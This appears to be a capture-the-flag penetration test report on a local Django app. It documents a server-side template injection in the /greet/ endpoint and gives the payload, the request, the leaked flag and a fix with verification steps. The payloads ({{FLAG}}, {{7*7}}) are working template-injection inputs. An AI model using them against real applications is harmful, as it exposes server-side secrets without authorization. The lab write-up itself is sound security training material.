## TL;DR
- Objective: Find hidden flag with hint "Check the context"
- Outcome: ACHIEVED
- Highest-impact finding: Server-Side Template Injection (SSTI) in Django application
- Validation status: Flag extracted via SSTI exploitation

## Target Information
- Target: 127.0.0.1:32915
- Host / base URL: http://127.0.0.1:32915
- Application or component: Django web application
- Authentication context: None required (unauthenticated endpoint)
- Relevant technology details: Django template engine, Python

## Confirmed Vulnerability
### Server-Side Template Injection (SSTI)
- Affected endpoint / component: `/greet/` endpoint with `name` GET parameter
- Impact: Arbitrary template code execution, access to server-side context variables, data exfiltration
- Preconditions: None (unauthenticated)
- Exact payload or PoC: `{{FLAG}}`

## Steps to Reproduce
1. Send HTTP GET request to `http://127.0.0.1:32915/greet/?name={{FLAG}}`
2. The application concatenates the `name` parameter directly into a Django template string
3. Django template engine processes `{{FLAG}}` as a template expression
4. The FLAG context variable (containing `/flag.txt` contents) is rendered in the response

## Validation / Evidence
- Validation token / flag: `FLAG{0d6abf1498911210d8a8ee29c20b5115e048723e08d8e07aa325a0799f9706a1}`
- Tool evidence: GET request to `/greet/` endpoint with SSTI payload
- Request evidence: `GET /greet/?name={{FLAG}}`
- Response evidence:
```html
<html><body><h1>Hello, FLAG{0d6abf1498911210d8a8ee29c20b5115e048723e08d8e07aa325a0799f9706a1}</h1></body></html>
```
- Notes on reliability / limitations: Highly reliable. The vulnerability stems from direct string concatenation of user input into template source code.

## Remediation
- Root cause: User-supplied input from `request.GET.get("name")` is directly concatenated into a Django template string using `engine.from_string()` without sanitization or escaping. The template context includes sensitive data (FLAG variable with `/flag.txt` contents).
- Recommended fix: 
  1. Never concatenate user input into template strings. Use template variables instead:
     ```python
     def greet(request):
         engine = engines["django"]
         template = engine.from_string("<html><body><h1>Hello, {{ name }}</h1></body></html>")
         context = {'name': request.GET.get("name", "")}
         return HttpResponse(template.render(context, request))
     ```
  2. Do not pass sensitive data (like flag contents) to template contexts unless absolutely necessary.
  3. Implement input validation and output encoding.
- Defense-in-depth: 
  - Use Django's built-in template auto-escaping (enabled by default for variable rendering)
  - Implement a Web Application Firewall (WAF) to detect template injection patterns
  - Run applications with least privilege and isolate sensitive files

## How to Verify the Fix
1. Send GET request to `http://127.0.0.1:32915/greet/?name={{FLAG}}`
2. Expected secure result: Response should display literal text `{{FLAG}}` or escaped version, not the flag contents
3. Send GET request to `http://127.0.0.1:32915/greet/?name={{7*7}}`
4. Expected secure result: Response should display literal text `{{7*7}}` or escaped version, not `49`
5. Verify that template expressions are not being evaluated

## Remaining Leads
- Confirmed blockers: None
- Unverified leads: None - objective achieved
- Missing context: None
